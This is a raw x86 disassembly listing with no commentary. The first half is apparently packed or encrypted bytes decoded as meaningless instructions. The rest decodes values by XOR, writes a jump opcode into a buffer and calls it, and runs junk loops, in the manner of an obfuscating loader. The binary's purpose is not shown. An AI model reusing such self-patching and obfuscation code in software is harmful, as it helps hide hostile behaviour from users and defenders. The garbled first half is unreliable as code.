  409848:	sti    
  409849:	dec    ebx
  40984a:	inc    ebp
  40984b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40984c:	mov    esi,0x20735b10
  409851:	sub    eax,0x78183e18
  409856:	cs add eax,0x54aa6af4
  40985c:	pop    ebx
  40985d:	ins    DWORD PTR es:[edi],dx
  40985e:	mov    BYTE PTR [esi+0x23],dl
  409861:	imul   eax,DWORD PTR [edi+0x14],0x59
  409865:	into   
  409866:	bound  ebp,QWORD PTR [ebx+0x3c]
  409869:	mov    esp,0x7ec82757
  40986e:	pop    esp
  40986f:	cmp    eax,DWORD PTR [ebx-0x2cfb669]
  409875:	fisttp QWORD PTR [ecx-0x60e8245e]
  40987b:	(bad)
  409880:	fbstp  TBYTE PTR [esi-0x3db01f0f]
  409886:	add    al,0x53
  409888:	pop    ss
  409889:	idiv   BYTE PTR [edi+0x3b]
  40988c:	rcl    BYTE PTR [ebp+0x1556b0ca],0x18
  409893:	push   DWORD PTR [edi-0x4ec3a648]
  409899:	push   es
  40989a:	lods   eax,DWORD PTR ds:[si]
  40989c:	jl     0x409911
  40989e:	inc    edx
  40989f:	xor    edi,edx
  4098a1:	arpl   ax,sp
  4098a3:	rcl    DWORD PTR [edi-0x7b],0xea
  4098a7:	inc    ecx
  4098a8:	retf   
  4098a9:	sbb    BYTE PTR ds:0x10fec498,cl
  4098af:	hlt    
  4098b0:	dec    ecx
  4098b1:	xchg   BYTE PTR [ebp+0x75],dh
  4098b4:	shr    ch,1
  4098b6:	fcomip st,st(6)
  4098b8:	imul   edi,ebx,0xeb186230
  4098be:	mov    bl,0xc0
  4098c0:	jmp    0x4098c3
  4098c2:	ins    BYTE PTR es:[edi],dx
  4098c3:	mov    edx,0x1b7a4632
  4098c8:	out    0xdd,al
  4098ca:	std    
  4098cb:	(bad)  
  4098cc:	push   0xffffffa7
  4098ce:	jecxz  0x4098ec
  4098d0:	out    dx,al
  4098d1:	fnstcw WORD PTR [ebp-0x52a6888a]
  4098d7:	ret    
  4098d8:	and    eax,0xba36e40b
  4098dd:	add    dl,BYTE PTR [ebx]
  4098df:	push   cs
  4098e0:	fiadd  DWORD PTR [edx+0xd]
  4098e3:	xchg   ebp,eax
  4098e4:	push   ecx
  4098e5:	loope  0x409912
  4098e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098e8:	jg     0x4098c1
  4098ea:	mov    bh,0x7b
  4098ec:	and    BYTE PTR [edi-0x7c5973c7],0x14
  4098f3:	adc    BYTE PTR [esi+0x1],bl
  4098f6:	add    edi,DWORD PTR [edi]
  4098f8:	dec    ecx
  4098fa:	imul   esp,DWORD PTR [esi],0xf252d276
  409900:	int    0xf5
  409902:	sub    BYTE PTR [edi+0x58],ch
  409905:	fs inc esp
  409907:	popf   
  409908:	xchg   ecx,eax
  409909:	rol    DWORD PTR [edx+0x1a0fe0da],1
  40990f:	push   ecx
  409910:	and    BYTE PTR [eax-0x2883606f],0x64
  409917:	addr16 or eax,0xb7e1d6b7
  40991d:	add    DWORD PTR [ecx+0x6c],edi
  409920:	pop    ss
  409921:	jge    0x409908
  409923:	cs xor ebp,eax
  409926:	je     0x4098ab
  409928:	dec    eax
  409929:	in     eax,0xb5
  40992b:	pushf  
  40992c:	adc    BYTE PTR [eax],dl
  40992e:	jge    0x409921
  409930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409931:	lock imul BYTE PTR [eax-0x5a]
  409935:	dec    eax
  409936:	int    0x1
  409938:	mov    ebp,0xf140962b
  40993d:	add    eax,0x2d446147
  409942:	fstp   DWORD PTR ds:0xc54487b5
  409948:	ror    BYTE PTR [esi+0x7c5c3614],1
  40994e:	int    0xdb
  409950:	fnstsw WORD PTR gs:[ebp+0x5a]
  409954:	cld    
  409955:	push   ecx
  409956:	fidiv  DWORD PTR [edx+ebp*4-0x71]
  40995a:	xchg   BYTE PTR gs:[edx-0x14a13d02],al
  409961:	or     eax,0x845dac0c
  409966:	pop    ebp
  409967:	cs aam 0x13
  40996a:	xchg   DWORD PTR [edi],ebp
  40996c:	in     eax,dx
  40996d:	inc    ebx
  40996e:	adc    al,0x65
  409970:	mov    al,ds:0x22bf7907
  409975:	inc    eax
  409976:	in     al,dx
  409977:	push   eax
  409978:	jnp    0x4099a1
  40997a:	mov    BYTE PTR [ebx],ch
  40997c:	sbb    bh,BYTE PTR [ebx-0x4b7640ad]
  409982:	hlt    
  409983:	cwde   
  409984:	adc    BYTE PTR [edx],0x3d
  409987:	fdivp  st(1),st
  409989:	imul   esi,ebx,0x15e90a87
  40998f:	shl    ah,cl
  409991:	jge    0x4099dd
  409993:	mov    bh,0x2b
  409995:	addr16 aad 0xf4
  409998:	repnz out 0x47,al
  40999b:	gs je  0x4099fa
  40999e:	popf   
  40999f:	xor    eax,0xaf8a26c0
  4099a4:	xor    dh,BYTE PTR [ecx+0x63]
  4099a7:	mov    eax,ds:0x35b23e29
  4099ac:	jp     0x409941
  4099ae:	cmp    esp,DWORD PTR [edi+0x10]
  4099b1:	mov    ds:0xcbb04c62,al
  4099b6:	pusha  
  4099b7:	test   al,0xbd
  4099b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099ba:	xchg   BYTE PTR [ebx+edi*4+0x572cbc71],bh
  4099c1:	xchg   ebp,eax
  4099c2:	daa    
  4099c3:	div    DWORD PTR [edi]
  4099c5:	mov    esi,DWORD PTR [edi]
  4099c7:	sbb    al,BYTE PTR [ecx+0x2a0adf07]
  4099cd:	cmp    ecx,eax
  4099cf:	mov    BYTE PTR [eax],ch
  4099d1:	loopne 0x4099f1
  4099d3:	pop    esp
  4099d4:	sar    ebx,cl
  4099d6:	cmp    BYTE PTR [eax+0x4e2c1604],bl
  4099dc:	xor    al,0xaa
  4099de:	push   eax
  4099df:	ja     0x4099e4
  4099e1:	imul   esi,DWORD PTR [ebp-0x7],0xffffffe4
  4099e5:	nop
  4099e6:	data16 xlat BYTE PTR ds:[ebx]
  4099e8:	jno    0x409979
  4099ea:	sbb    BYTE PTR [edx],bh
  4099ec:	rcl    BYTE PTR [ecx],1
  4099ee:	jno    0x4099d3
  4099f0:	repnz ins DWORD PTR es:[edi],dx
  4099f2:	gs push edi
  4099f4:	cmp    cl,BYTE PTR [eax]
  4099f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099f7:	loop   0x4099c9
  4099f9:	adc    esi,edi
  4099fb:	jae    0x4099bb
  4099fd:	out    dx,eax
  4099fe:	cwde   
  4099ff:	popf   
  409a00:	jle    0x4099a0
  409a02:	clc    
  409a03:	pop    ebp
  409a04:	xchg   edi,eax
  409a05:	js     0x4099e5
  409a07:	nop
  409a08:	inc    esp
  409a09:	sar    BYTE PTR [edx-0x30],1
  409a0c:	xor    ecx,DWORD PTR ss:0x85dfb4fe
  409a13:	idiv   BYTE PTR [ebx+ebx*4]
  409a16:	iret   
  409a17:	retf   
  409a18:	clc    
  409a19:	ds mov edi,0xd083364a
  409a1f:	cmp    DWORD PTR [ebx+0x1fd8fc7d],ebp
  409a25:	sbb    dh,ah
  409a27:	jne    0x4099fa
  409a29:	xor    al,0x6c
  409a2b:	repz fcomp QWORD PTR [edi-0x5b]
  409a2f:	inc    eax
  409a30:	arpl   WORD PTR [edx+0x7],sp
  409a33:	(bad)  
  409a34:	add    ax,0x41e5
  409a38:	test   al,dl
  409a3a:	daa    
  409a3b:	jl     0x409a16
  409a3d:	push   0x25285548
  409a42:	dec    ecx
  409a43:	stc    
  409a44:	(bad)  
  409a45:	jmp    0x409a65
  409a47:	xor    BYTE PTR [ecx+eiz*1-0x78],0x94
  409a4c:	test   DWORD PTR [ecx-0x27586893],ebp
  409a52:	(bad)  
  409a53:	sub    bl,BYTE PTR [edi-0x58]
  409a56:	js     0x409a08
  409a58:	pop    esi
  409a59:	adc    edi,eax
  409a5b:	gs pop edx
  409a5d:	popf   
  409a5e:	push   ebx
  409a5f:	fild   QWORD PTR [ebp-0x39]
  409a62:	popf   
  409a63:	add    DWORD PTR [ebx-0x71],esp
  409a66:	jnp    0x409a59
  409a68:	jo     0x409a4b
  409a6a:	jne    0x409a36
  409a6c:	inc    edi
  409a6d:	pop    ecx
  409a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a6f:	fisub  WORD PTR [edx+0x3c]
  409a72:	das    
  409a73:	frstor [edi-0x40efeae6]
  409a79:	leave  
  409a7a:	leave  
  409a7b:	jecxz  0x409ab0
  409a7d:	out    dx,al
  409a7e:	in     eax,dx
  409a7f:	int    0x20
  409a81:	inc    ebx
  409a82:	shr    BYTE PTR [edi],0xc3
  409a85:	outs   dx,BYTE PTR ds:[esi]
  409a86:	test   al,0x46
  409a88:	scas   eax,DWORD PTR es:[edi]
  409a89:	sub    cl,al
  409a8b:	inc    esi
  409a8c:	adc    eax,0x6e6be2df
  409a91:	pop    edx
  409a92:	scas   eax,DWORD PTR es:[edi]
  409a93:	mov    ah,0x5a
  409a95:	jge    0x409a7e
  409a97:	fisub  DWORD PTR [esi-0x24]
  409a9a:	mov    bh,0xfa
  409a9c:	xor    eax,DWORD PTR [eax-0x25a2ea5a]
  409aa2:	pop    eax
  409aa3:	mov    cl,0x46
  409aa5:	sbb    eax,0x54863a10
  409aaa:	mov    ds:0x73b6d04b,al
  409aaf:	rcr    BYTE PTR [edx-0x30eb9c6d],cl
  409ab5:	jecxz  0x409a8f
  409ab7:	mov    DWORD PTR [eax+eax*2],0xb2d4a555
  409abe:	inc    esi
  409abf:	pop    eax
  409ac0:	bound  esi,QWORD PTR [eax-0x2a6fe94d]
  409ac6:	cmp    al,0x5a
  409ac8:	inc    ecx
  409ac9:	stos   DWORD PTR es:[edi],eax
  409aca:	nop
  409acb:	rcr    DWORD PTR [ecx],0xac
  409ace:	nop
  409acf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ad0:	dec    edx
  409ad1:	lods   al,BYTE PTR ds:[esi]
  409ad2:	or     bh,BYTE PTR [ebx]
  409ad4:	and    al,0x1
  409ad6:	xchg   esi,eax
  409ad7:	mov    bl,0xe3
  409ad9:	mov    cl,BYTE PTR [ecx+0x4e4b12f1]
  409adf:	add    al,0xbb
  409ae1:	jnp    0x409af0
  409ae3:	jne    0x409a7d
  409ae5:	clc    
  409ae6:	jle    0x409ab7
  409ae8:	(bad)  
  409ae9:	pop    eax
  409aea:	loope  0x409b3a
  409aec:	sub    ebp,DWORD PTR [eax]
  409aee:	xor    dl,BYTE PTR [ecx-0x3]
  409af1:	daa    
  409af2:	mov    ?,esi
  409af4:	push   esp
  409af5:	retf   0x5d2e
  409af8:	fnstsw WORD PTR [edi]
  409afa:	neg    ecx
  409afc:	sbb    eax,0xf74355f7
  409b01:	jmp    FWORD PTR [edi]
  409b03:	or     bl,BYTE PTR [ecx-0x38]
  409b06:	bound  esi,QWORD PTR [ebx+0xe]
  409b09:	cmc    
  409b0a:	daa    
  409b0b:	mov    ah,0xf0
  409b0d:	(bad)  
  409b0e:	aas    
  409b0f:	into   
  409b10:	arpl   WORD PTR [edx],si
  409b12:	inc    ebx
  409b13:	xor    DWORD PTR [edx],edx
  409b15:	jb     0x409aa1
  409b17:	xchg   edx,eax
  409b18:	lds    ecx,FWORD PTR [ebx-0x7c]
  409b1b:	sti    
  409b1c:	leave  
  409b1d:	pop    eax
  409b1e:	push   ebx
  409b1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b20:	in     eax,0xe2
  409b22:	pop    ebx
  409b23:	push   0x90c85d96
  409b28:	fs or  esi,DWORD PTR es:[esi+0x3e]
  409b2d:	leave  
  409b2e:	mov    edi,0x90530cf7
  409b33:	ret    
  409b34:	or     ecx,ecx
  409b36:	jbe    0x409b1c
  409b38:	sbb    bh,ch
  409b3a:	adc    edx,DWORD PTR [esi-0x4387402f]
  409b40:	pop    edx
  409b41:	jle    0x409b9f
  409b43:	or     edi,DWORD PTR [ebp+0x56082e6c]
  409b49:	mov    ds:0xd66aed93,al
  409b4e:	sahf   
  409b4f:	sub    DWORD PTR [ebx-0x1100cdb9],0xffffffa1
  409b56:	push   es
  409b57:	push   ebp
  409b58:	sti    
  409b59:	gs jl  0x409b23
  409b5c:	xchg   esp,eax
  409b5d:	stc    
  409b5e:	addr16 xchg esi,eax
  409b60:	cld    
  409b61:	scas   eax,DWORD PTR es:[edi]
  409b62:	push   ebp
  409b63:	shl    DWORD PTR [edx-0x508466f6],0x1c
  409b6a:	in     al,dx
  409b6b:	retf   
  409b6c:	push   edi
  409b6d:	add    al,0x8a
  409b6f:	dec    ebx
  409b70:	aam    0xa
  409b72:	jge    0x409b66
  409b74:	cmp    BYTE PTR [ecx],0x79
  409b77:	jo     0x409b1c
  409b79:	cdq    
  409b7a:	call   0xce0d111
  409b7f:	dec    edi
  409b80:	fs or  ecx,edi
  409b83:	pop    ss
  409b84:	push   ecx
  409b85:	or     al,0x79
  409b87:	ins    BYTE PTR es:[edi],dx
  409b88:	xor    ah,BYTE PTR cs:[ecx]
  409b8b:	mov    al,ds:0x93fdc8a6
  409b90:	pop    es
  409b91:	dec    esp
  409b92:	imul   DWORD PTR [eax-0x7f]
  409b95:	mov    WORD PTR [esi+eiz*2],ds
  409b98:	repz lea ebp,cs:[ebx-0x6ccc94af]
  409ba0:	stos   DWORD PTR es:[edi],eax
  409ba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ba2:	nop
  409ba3:	imul   ebp,esi,0xd603ffd0
  409ba9:	cmp    bl,BYTE PTR [eax+0x5a226543]
  409baf:	jl     0x409be4
  409bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bb2:	aad    0x23
  409bb4:	popa   
  409bb5:	cmc    
  409bb6:	ss stc 
  409bb8:	inc    esp
  409bb9:	add    edi,0x1f992f13
  409bbf:	fisub  WORD PTR [edx+0x55d34a3e]
  409bc5:	aaa    
  409bc6:	inc    esi
  409bc7:	(bad)  
  409bc9:	push   ds
  409bca:	mov    gs,WORD PTR [esi+0x29]
  409bcd:	jmp    0x409bd8
  409bcf:	jmp    0x6a82:0x59f63ca0
  409bd6:	push   ebx
  409bd7:	push   es
  409bd8:	fwait
  409bd9:	adc    esp,DWORD PTR [ecx]
  409bdb:	(bad)  
  409bdc:	in     al,dx
  409bdd:	mov    ah,dl
  409bdf:	(bad)  
  409be1:	mov    ch,0xe8
  409be3:	ror    DWORD PTR [ebx],cl
  409be5:	in     eax,0xa5
  409be7:	jne    0x409b89
  409be9:	das    
  409bea:	xchg   ecx,eax
  409beb:	add    eax,ebp
  409bed:	stc    
  409bee:	and    ebx,DWORD PTR [eax+edx*2+0x29]
  409bf2:	xchg   esi,eax
  409bf3:	mov    BYTE PTR [edi-0x53],0xd
  409bf7:	pusha  
  409bf8:	test   ah,dh
  409bfa:	inc    ebx
  409bfb:	dec    ebp
  409bfc:	repz push ss
  409bfe:	stc    
  409bff:	adc    esi,DWORD PTR [esi+ecx*1-0x10410cc0]
  409c06:	sub    cl,dl
  409c08:	add    esp,DWORD PTR [edi]
  409c0a:	(bad)
  409c0e:	push   cs
  409c0f:	and    BYTE PTR [esi+0x58],al
  409c12:	xor    edi,DWORD PTR [edx+0x53]
  409c15:	sub    esi,DWORD PTR [esi+0x5f8edc94]
  409c1b:	or     al,0xbf
  409c1d:	and    ch,BYTE PTR [ebx]
  409c1f:	lods   al,BYTE PTR ds:[esi]
  409c20:	out    0xe8,al
  409c22:	xlat   BYTE PTR ds:[ebx]
  409c23:	mov    ebx,esi
  409c25:	dec    eax
  409c26:	jno    0x409bac
  409c28:	shr    BYTE PTR [ebp-0x6310daba],0xe0
  409c2f:	mov    ecx,DWORD PTR [ebp+0x516a2094]
  409c35:	fdiv   DWORD PTR [ecx-0x23531e19]
  409c3b:	mov    dl,0x20
  409c3d:	cld    
  409c3e:	int    0xc6
  409c40:	fistp  WORD PTR [ebx-0xe1f68e]
  409c46:	out    0x89,al
  409c48:	out    dx,al
  409c49:	imul   ecx,DWORD PTR [edx],0x24adf711
  409c4f:	sbb    eax,0x8df4d0e7
  409c54:	mov    edi,0x8a9116db
  409c59:	push   0x7a44c11b
  409c5e:	call   0x5443796e
  409c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c64:	in     eax,0xb
  409c66:	out    0xa1,eax
  409c68:	pop    edi
  409c69:	bound  edi,QWORD PTR [ebx+eiz*1-0x5dc96c67]
  409c70:	test   eax,0x31ca2479
  409c75:	test   al,0xdb
  409c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c78:	push   ebx
  409c79:	stos   BYTE PTR es:[edi],al
  409c7a:	leave  
  409c7b:	xchg   edi,eax
  409c7c:	jg     0x409cf2
  409c7e:	pop    ebp
  409c7f:	inc    BYTE PTR [edi]
  409c81:	in     al,0x77
  409c83:	mov    edx,0x1e5914a0
  409c88:	inc    esi
  409c89:	dec    ebp
  409c8a:	shl    BYTE PTR [eax],1
  409c8c:	push   esp
  409c8d:	pop    esp
  409c8e:	cmp    BYTE PTR [ebx+0x5e],bh
  409c91:	out    dx,eax
  409c92:	mov    dh,0x3c
  409c94:	or     bh,BYTE PTR [edx]
  409c96:	sti    
  409c97:	jae    0x409cea
  409c99:	jecxz  0x409cf0
  409c9b:	jle    0x409c79
  409c9d:	in     eax,dx
  409c9e:	push   0x56a5d632
  409ca3:	cmp    al,0x32
  409ca5:	cli    
  409ca6:	test   eax,0xf3da6ae7
  409cab:	stos   BYTE PTR es:[edi],al
  409cac:	xchg   edx,eax
  409cae:	clc    
  409caf:	test   BYTE PTR [eax+0x4a],0x13
  409cb3:	inc    edi
  409cb4:	lahf   
  409cb5:	stos   DWORD PTR es:[edi],eax
  409cb6:	sbb    eax,0xd709c9c4
  409cbb:	std    
  409cbc:	mov    ah,BYTE PTR [edi-0x6b]
  409cbf:	or     eax,0x84c14fe4
  409cc4:	xor    BYTE PTR [esi-0x79],0x4
  409cc8:	xor    cl,ch
  409cca:	dec    edx
  409ccb:	cmp    DWORD PTR [esi-0x18],ecx
  409cce:	iret   
  409ccf:	or     DWORD PTR [edx],ebp
  409cd1:	mov    dl,0x5f
  409cd3:	sub    al,0xe2
  409cd5:	xor    ah,BYTE PTR [ebp+0x61]
  409cd8:	ds mov bl,0x20
  409cdb:	xor    BYTE PTR [edi+0x4c],ah
  409cde:	add    eax,0x8d865b7b
  409ce3:	cmp    al,0x78
  409ce5:	mov    ebp,0xb227d70f
  409cea:	sbb    dh,al
  409cec:	jnp    0x409d54
  409cee:	jmp    0x9c21:0xa5f0575f
  409cf5:	mov    DWORD PTR [edi],edi
  409cf7:	addr16 xchg ebp,esi
  409cfa:	stos   BYTE PTR es:[edi],al
  409cfb:	adc    al,0x68
  409cfd:	dec    esp
  409cfe:	jmp    DWORD PTR [edi]
  409d00:	jle    0x409ccc
  409d02:	dec    edx
  409d03:	ret    0x40f2
  409d06:	icebp  
  409d07:	jb     0x409d74
  409d09:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d0b:	mov    ah,0x77
  409d0d:	sbb    al,0xfa
  409d0f:	rol    BYTE PTR [eax+0x6e58d572],1
  409d15:	retf   
  409d16:	int3   
  409d17:	jno    0x409ca0
  409d19:	xchg   ebx,eax
  409d1a:	or     ch,dl
  409d1c:	les    ebx,FWORD PTR [edx-0x2a]
  409d1f:	sbb    edx,DWORD PTR ds:0x4c81711f
  409d25:	fsub   DWORD PTR [edx-0x6a]
  409d28:	mov    esp,0xaee0b1c
  409d2d:	cwde   
  409d2e:	(bad)  
  409d30:	pop    eax
  409d31:	push   ds
  409d32:	cmp    esp,DWORD PTR [esi-0x29c48999]
  409d38:	or     al,0xf8
  409d3a:	ins    DWORD PTR es:[edi],dx
  409d3b:	sub    esi,eax
  409d3d:	jge    0x409db9
  409d3f:	sbb    edi,DWORD PTR [ebx]
  409d41:	mov    dl,0xf8
  409d43:	pop    esp
  409d44:	sub    bh,cl
  409d46:	mov    edx,0x41cbd806
  409d4b:	and    al,0xb5
  409d4d:	push   ebx
  409d4f:	push   ss
  409d50:	(bad)  
  409d52:	sar    BYTE PTR [edi-0x56],1
  409d55:	lds    ebp,FWORD PTR [ecx]
  409d57:	mov    al,0x2b
  409d59:	push   ebp
  409d5a:	fld    TBYTE PTR [ecx-0x6b]
  409d5d:	imul   ebx,DWORD PTR [esi],0xdd5165af
  409d63:	lahf   
  409d64:	retf   0x173f
  409d67:	mov    al,0xad
  409d69:	xlat   BYTE PTR ds:[ebx]
  409d6a:	xor    eax,0xd92ad80f
  409d6f:	mov    ch,0xe6
  409d71:	push   0x479114dd
  409d76:	push   ebp
  409d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d78:	(bad)  
  409d79:	jmp    0x9654:0xbb3edc39
  409d80:	ret    0x3ec1
  409d83:	scas   al,BYTE PTR es:[edi]
  409d84:	cmp    eax,0xc214820
  409d89:	xchg   edi,eax
  409d8a:	fsubp  st(0),st
  409d8c:	in     eax,dx
  409d8d:	jmp    0x409d0f
  409d8f:	or     BYTE PTR [ebx+0x66],cl
  409d92:	in     al,0x9d
  409d94:	scas   eax,DWORD PTR es:[edi]
  409d95:	in     eax,0x87
  409d97:	adc    al,0xe3
  409d99:	lods   eax,DWORD PTR ds:[esi]
  409d9a:	mov    ebx,0x40c235c1
  409d9f:	lea    esp,[esi-0x53]
  409da2:	push   esp
  409da3:	sub    al,0x7e
  409da5:	aaa    
  409da6:	add    BYTE PTR [eax],bl
  409da8:	jmp    0x409d47
  409daa:	rcl    BYTE PTR [edi+0x67],0xc9
  409dae:	aad    0x8d
  409db0:	into   
  409db1:	(bad)  
  409db2:	rcr    BYTE PTR cs:[eax],cl
  409db5:	adc    dh,ch
  409db7:	loop   0x409daf
  409db9:	pop    esp
  409dba:	scas   eax,DWORD PTR es:[edi]
  409dbb:	push   edi
  409dbc:	test   DWORD PTR [esi],edx
  409dbe:	in     al,dx
  409dbf:	inc    edx
  409dc0:	inc    ecx
  409dc1:	sub    eax,0xc30989bf
  409dc6:	jmp    0xeebdf6b0
  409dcb:	scas   al,BYTE PTR es:[edi]
  409dcc:	push   ebx
  409dcd:	mov    bl,0x20
  409dcf:	pop    ebx
  409dd0:	cmp    edx,DWORD PTR ds:0xd2ab41c2
  409dd6:	out    0x2c,al
  409dd8:	jg     0x409d91
  409dda:	xchg   ebx,eax
  409ddb:	cmp    ax,0x7547
  409ddf:	dec    eax
  409de0:	int3   
  409de1:	mov    ebx,fs
  409de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409de4:	add    bh,BYTE PTR [esi-0x127bfdf7]
  409dea:	popa   
  409deb:	dec    edi
  409dec:	jmp    0x89c1:0x2b534d05
  409df3:	inc    ebp
  409df4:	cld    
  409df5:	or     DWORD PTR [ebp-0x4],0xf89c85bc
  409dfc:	mov    eax,DWORD PTR [ebp-0xc]
  409dff:	xor    eax,esi
  409e01:	add    eax,edi
  409e03:	push   eax
  409e04:	mov    eax,DWORD PTR [ebp-0x10]
  409e07:	xor    eax,esi
  409e09:	add    eax,edi
  409e0b:	push   eax
  409e0c:	mov    eax,DWORD PTR [ebp-0x4]
  409e0f:	xor    eax,esi
  409e11:	add    eax,edi
  409e13:	push   eax
  409e14:	lea    eax,[ebp-0x7c]
  409e17:	push   eax
  409e18:	push   DWORD PTR [ebp-0x2c]
  409e1b:	push   DWORD PTR [ebp-0x28]
  409e1e:	call   0x40c8dd
  409e23:	test   eax,eax
  409e25:	je     0x409e53
  409e2b:	lea    eax,[ebp-0x7c]
  409e2e:	push   eax
  409e2f:	mov    eax,DWORD PTR [ebp-0x28]
  409e32:	xor    eax,esi
  409e34:	add    eax,edi
  409e36:	push   eax
  409e37:	mov    eax,DWORD PTR [ebp-0x24]
  409e3a:	add    eax,0xaa
  409e3f:	push   eax
  409e40:	mov    eax,DWORD PTR [ebp-0x24]
  409e43:	mov    eax,DWORD PTR [eax+0x198]
  409e49:	push   DWORD PTR [eax]
  409e4b:	call   0x402992
  409e50:	mov    DWORD PTR [ebp-0x14],eax
  409e53:	lea    eax,[ebp+0x4]
  409e56:	mov    DWORD PTR [ebp-0x30],eax
  409e59:	mov    eax,DWORD PTR [ebp-0x14]
  409e5c:	test   eax,eax
  409e5e:	je     0x409ec6
  409e64:	lea    eax,[ebp-0x8]
  409e67:	mov    DWORD PTR [ebp-0x38],eax
  409e6a:	mov    eax,DWORD PTR [ebp-0x34]
  409e6d:	mov    DWORD PTR [ebp-0x8],eax
  409e70:	mov    eax,DWORD PTR [ebp-0x8]
  409e73:	mov    ecx,DWORD PTR [ebp-0x14]
  409e76:	sub    eax,ecx
  409e78:	mov    DWORD PTR [ebp-0x8],eax
  409e7b:	mov    ecx,DWORD PTR [ebp-0x4]
  409e7e:	xor    ecx,esi
  409e80:	mov    eax,0xffcd8d20
  409e85:	sub    eax,ecx
  409e87:	add    DWORD PTR [ebp-0x8],eax
  409e8a:	mov    eax,DWORD PTR [ebp-0x8]
  409e8d:	mov    ecx,DWORD PTR [ebp-0x14]
  409e90:	mov    DWORD PTR [ecx+0x1],eax
  409e93:	mov    eax,DWORD PTR [ebp-0x14]
  409e96:	push   DWORD PTR [ebp-0x24]
  409e99:	mov    BYTE PTR [eax],0xe9
  409e9c:	mov    eax,ds:0x42e18f
  409ea1:	push   DWORD PTR [eax]
  409ea3:	push   DWORD PTR ds:0x42e3eb
  409ea9:	push   DWORD PTR ds:0x42e197
  409eaf:	push   DWORD PTR ds:0x42e3cb
  409eb5:	push   DWORD PTR ds:0x42e6f3
  409ebb:	push   DWORD PTR [ebp-0x28]
  409ebe:	push   DWORD PTR [ebp-0x2c]
  409ec1:	mov    eax,DWORD PTR [ebp-0x14]
  409ec4:	call   eax
  409ec6:	mov    eax,DWORD PTR [ebp-0x30]
  409ec9:	mov    ecx,DWORD PTR ds:0x42e38f
  409ecf:	add    DWORD PTR [eax],ecx
  409ed1:	pop    edi
  409ed2:	pop    esi
  409ed3:	leave  
  409ed4:	ret    
  409ed5:	push   ebp
  409ed6:	mov    ebp,esp
  409ed8:	sub    esp,0x18
  409edb:	add    edx,DWORD PTR ds:0x42c004
  409ee1:	mov    DWORD PTR [ebp-0x10],0xf89f85b9
  409ee8:	xor    DWORD PTR ds:0x42d018,0x529f
  409ef2:	lea    eax,[ebp+0x14]
  409ef5:	sbb    ecx,edx
  409ef7:	mov    DWORD PTR [ebp-0x4],eax
  409efa:	add    DWORD PTR ds:0x429010,edx
  409f00:	push   esi
  409f01:	mov    DWORD PTR ds:0x429000,0x1b
  409f0b:	cmp    DWORD PTR ds:0x429000,0x0
  409f12:	je     0x409f77
  409f18:	cmp    DWORD PTR ds:0x429000,0xb
  409f1f:	jne    0x409f38
  409f25:	push   DWORD PTR [ebp-0x28]
  409f28:	push   0x0
  409f2a:	push   0x42d010
  409f2f:	push   DWORD PTR [ebp-0x1c]
  409f32:	call   DWORD PTR ds:0x42e9af
  409f38:	cmp    DWORD PTR ds:0x429000,0xc
  409f3f:	jne    0x409f54
  409f45:	xor    esi,esi
  409f47:	or     esi,DWORD PTR ds:0x429000
  409f4d:	dec    esi
  409f4e:	mov    DWORD PTR ds:0x429000,esi
  409f54:	mov    esi,DWORD PTR ds:0x429000
  409f5a:	dec    esi
  409f5b:	mov    DWORD PTR ds:0x429000,esi
  409f61:	jmp    0x409f0b
  409f66:	mov    ecx,DWORD PTR ds:0x41ac60
  409f6c:	mov    edx,DWORD PTR ds:0x41ac64
  409f72:	sub    ecx,edx
  409f74:	xor    ecx,DWORD PTR [ecx+edx*1]
  409f77:	mov    esi,0xf89c85b9
  409f7c:	xor    DWORD PTR ds:0x429028,edx
  409f82:	mov    DWORD PTR [ebp-0xc],esi
  409f85:	sub    DWORD PTR ds:0x42a014,edi
  409f8b:	lea    eax,[ebp-0xc]
  409f8e:	movzx  edx,BYTE PTR ds:0x42c014
  409f95:	adc    edx,DWORD PTR ds:0x42a004
  409f9b:	mov    DWORD PTR ds:0x42c014,edx
  409fa1:	mov    DWORD PTR [ebp-0x14],eax
  409fa4:	or     DWORD PTR ds:0x42d010,0xdad
  409fae:	mov    eax,DWORD PTR [ebp-0xc]
  409fb1:	and    DWORD PTR ds:0x429008,0x0
  409fbb:	jmp    0x409fcd
  409fc0:	mov    ecx,DWORD PTR ds:0x429008
  409fc6:	inc    ecx
  409fc7:	mov    DWORD PTR ds:0x429008,ecx
  409fcd:	cmp    DWORD PTR ds:0x429008,0x15
  409fd4:	jae    0x40a012
  409fda:	cmp    DWORD PTR ds:0x429008,0x9
  409fe1:	jne    0x409fed
  409fe7:	call   DWORD PTR ds:0x42e9b3
  409fed:	cmp    DWORD PTR ds:0x429008,0x8
  409ff4:	jne    0x40a007
  409ffa:	mov    ecx,DWORD PTR ds:0x429008
  40a000:	inc    ecx
  40a001:	mov    DWORD PTR ds:0x429008,ecx
  40a007:	jmp    0x409fc0
  40a00c:	sub    DWORD PTR ds:0x42901c,edx
  40a012:	mov    edx,DWORD PTR [ebp-0x14]
  40a015:	and    DWORD PTR ds:0x42b010,0x0
  40a01f:	jmp    0x40a031
  40a024:	mov    ecx,DWORD PTR ds:0x42b010
  40a02a:	inc    ecx
  40a02b:	mov    DWORD PTR ds:0x42b010,ecx
  40a031:	cmp    DWORD PTR ds:0x42b010,0x17
  40a038:	jae    0x40a06e
  40a03e:	cmp    DWORD PTR ds:0x42b010,0x19
  40a045:	jne    0x40a069
  40a04b:	push   DWORD PTR [ebp-0x10]
  40a04e:	push   0x429008
  40a053:	push   0x87b9
  40a058:	push   DWORD PTR [ebp-0x1c]
  40a05b:	push   DWORD PTR [ebp-0x24]
  40a05e:	push   0x8ec6
